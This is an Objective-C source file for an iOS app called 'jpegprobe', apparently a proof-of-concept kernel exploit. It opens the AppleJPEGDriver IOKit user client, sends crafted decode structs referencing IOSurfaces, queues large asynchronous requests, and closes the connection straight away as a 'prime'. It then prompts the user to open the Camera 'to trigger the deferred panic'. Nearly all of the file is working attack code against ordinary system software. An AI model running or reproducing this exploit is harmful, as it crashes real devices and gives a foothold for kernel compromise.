#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <unistd.h>
#import <stdarg.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

extern const mach_port_t kIOMainPortDefault;
kern_return_t IOServiceGetMatchingServices(mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *existing);
io_object_t IOIteratorNext(io_iterator_t iterator);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IOConnectCallMethod(io_connect_t connect, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallStructMethod(io_connect_t connect, uint32_t selector,
    const void *inputStruct, size_t inputStructCnt,
    void *outputStruct, size_t *outputStructCnt);
CFMutableDictionaryRef IOServiceMatching(const char *name);

typedef struct __attribute__((packed)) {
    uint32_t sourceID;
    uint32_t field_04;
    uint32_t destID;
    uint32_t field_0C;
    uint32_t field_10;
    uint32_t width;
    uint32_t height;
    uint32_t field_1C;
    uint8_t  flags;
    uint8_t  pad_21[3];
    uint32_t xOffset;
    uint32_t yOffset;
    uint32_t subsampling;
    uint64_t asyncToken;
    uint64_t asyncToken2;
    uint64_t field_40;
    uint32_t codecID;
    uint32_t outWidth;
    uint32_t outHeight;
    uint32_t field_54;
} AppleJPEGDriverIOStruct;

_Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58, "struct size");

static UITextView *gLog = nil;
static volatile int gStop = 0;

static NSString *docsPath(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}
static NSString *logPath(void) {
    return [docsPath() stringByAppendingPathComponent:@"jpegprobe.log"];
}
static void appendLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[jpegprobe] %@", s);
    NSString *path = logPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @finally {
            [fh closeFile];
        }
    }
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            gLog.text = [gLog.text stringByAppendingFormat:@"%@\n", s];
            NSRange r = NSMakeRange(gLog.text.length, 0);
            [gLog scrollRangeToVisible:r];
        });
    }
}

static io_service_t findJPEGService(void) {
    CFMutableDictionaryRef matching = IOServiceMatching("AppleJPEGDriver");
    if (!matching) return 0;
    io_iterator_t iter = 0;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter);
    if (kr != KERN_SUCCESS || !iter) {
        appendLog(@"matching kr=%#x", kr);
        return 0;
    }
    io_service_t svc = IOIteratorNext(iter);
    IOObjectRelease(iter);
    return svc;
}

static NSData *makeJPEG(uint32_t w, uint32_t h) {
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    [[UIColor blueColor] setFill];
    UIRectFill(CGRectMake(0, 0, w / 2, h / 2));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

static IOSurfaceRef makeSourceSurface(NSData *jpegData) {
    size_t len = jpegData.length;
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(allocLen),
        (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @1,
        (id)kIOSurfacePixelFormat: @0x20202020,
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return NULL;
    IOSurfaceLock(surf, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    memcpy(base, jpegData.bytes, jpegData.length);
    IOSurfaceUnlock(surf, 0, NULL);
    return surf;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(w),
        (id)kIOSurfaceHeight: @(h),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @0x42475241,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static int submitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       uint32_t w, uint32_t h, int count, uint64_t tokenBase) {
    int submitted = 0;
    for (int j = 0; j < count; j++) {
        AppleJPEGDriverIOStruct input = {0};
        AppleJPEGDriverIOStruct output = {0};
        input.sourceID = srcID;
        input.field_04 = w * h;
        input.destID = dstID;
        input.field_0C = w * h * 4;
        input.width = w;
        input.height = h;
        input.outWidth = w;
        input.outHeight = h;
        input.subsampling = 3;
        input.asyncToken = tokenBase + j;
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
        appendLog(@"  submit[%d] kr=%#x token=%#llx out=%#x/%#x", j, kr,
                  (unsigned long long)input.asyncToken, output.sourceID, output.destID);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

static void probeAll(void) {
    appendLog(@"build=jpegprobe pid=%d", getpid());

    io_service_t svc = findJPEGService();
    if (!svc) {
        appendLog(@"AppleJPEGDriver service not found");
        return;
    }
    appendLog(@"service=%#x", svc);

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    appendLog(@"open type0 kr=%#x conn=%#x", kr, conn);
    if (kr != KERN_SUCCESS || !conn) {
        appendLog(@"open failed; trying type 1");
        kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
        appendLog(@"open type1 kr=%#x conn=%#x", kr, conn);
    }
    if (kr != KERN_SUCCESS || !conn) {
        appendLog(@"cannot open userclient");
        IOObjectRelease(svc);
        return;
    }

    uint64_t out[8] = {0};
    uint32_t outCnt = 8;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
    appendLog(@"sel0 kr=%#x outCnt=%u", kr, outCnt);
    outCnt = 8;
    kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0, out, &outCnt, NULL, NULL);
    appendLog(@"sel2 kr=%#x outCnt=%u", kr, outCnt);
    kr = IOConnectCallMethod(conn, 9, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
    appendLog(@"sel9 kr=%#x", kr);
    kr = IOConnectCallMethod(conn, 10, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
    appendLog(@"sel10 kr=%#x", kr);

    const uint32_t W = 64, H = 64;
    NSData *jpegData = makeJPEG(W, H);
    appendLog(@"jpeg bytes=%lu", (unsigned long)jpegData.length);
    IOSurfaceRef src = makeSourceSurface(jpegData);
    IOSurfaceRef dst = makeDestSurface(W, H);
    appendLog(@"surfaces src=%p dst=%p", src, dst);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOServiceClose(conn);
        IOObjectRelease(svc);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(src);
    uint32_t dstID = IOSurfaceGetID(dst);
    appendLog(@"srcID=%u dstID=%u", srcID, dstID);

    AppleJPEGDriverIOStruct input = {0};
    AppleJPEGDriverIOStruct output = {0};
    size_t outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
    appendLog(@"sel1 zero kr=%#x outSize=%zu", kr, outSize);

    memset(&input, 0, sizeof(input));
    input.sourceID = srcID;
    input.destID = dstID;
    input.width = W;
    input.height = H;
    input.outWidth = W;
    input.outHeight = H;
    input.subsampling = 0;
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
    appendLog(@"sel1 sync444 kr=%#x outSize=%zu", kr, outSize);

    memset(&input, 0, sizeof(input));
    input.sourceID = srcID;
    input.destID = dstID;
    input.width = W;
    input.height = H;
    input.outWidth = W;
    input.outHeight = H;
    input.subsampling = 3;
    input.asyncToken = 0x4141;
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
    appendLog(@"sel1 async64 kr=%#x outSize=%zu", kr, outSize);

    /* Now the real prime: 2048x2048 async requests, then close. */
    const uint32_t BW = 2048, BH = 2048;
    NSData *bigJPEG = makeJPEG(BW, BH);
    IOSurfaceRef bigSrc = makeSourceSurface(bigJPEG);
    IOSurfaceRef bigDst = makeDestSurface(BW, BH);
    appendLog(@"big jpeg=%lu src=%p dst=%p", (unsigned long)bigJPEG.length, bigSrc, bigDst);
    if (bigSrc && bigDst) {
        uint32_t bsID = IOSurfaceGetID(bigSrc);
        uint32_t bdID = IOSurfaceGetID(bigDst);
        int n = submitAsync(conn, bsID, bdID, BW, BH, 5, 0x4141);
        appendLog(@"submitted=%d", n);
        IOServiceClose(conn);
        conn = 0;
        appendLog(@"closed after async submit");
        usleep(500000);
        appendLog(@"waited 500ms, showing CAMERA prompt");
        dispatch_async(dispatch_get_main_queue(), ^{
            NSURL *cameraURL = [NSURL URLWithString:@"camera://"];
            [[UIApplication sharedApplication] openURL:cameraURL options:@{} completionHandler:^(BOOL ok) {
                appendLog(@"camera:// opened=%d", ok);
            }];
            UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Open Camera"
                message:@"Prime done. Open Camera now to trigger the deferred panic."
                preferredStyle:UIAlertControllerStyleAlert];
            [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            UIViewController *vc = [UIApplication sharedApplication].keyWindow.rootViewController;
            [vc presentViewController:a animated:YES completion:nil];
        });
        CFRelease(bigSrc);
        CFRelease(bigDst);
    } else {
        if (bigSrc) CFRelease(bigSrc);
        if (bigDst) CFRelease(bigDst);
        if (conn) IOServiceClose(conn);
    }

    CFRelease(src);
    CFRelease(dst);
    IOObjectRelease(svc);
    appendLog(@"jpegprobe done (no panic yet)");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *textView;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];

    self.textView = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.textView.editable = NO;
    [vc.view addSubview:self.textView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    gLog = self.textView;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        probeAll();
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
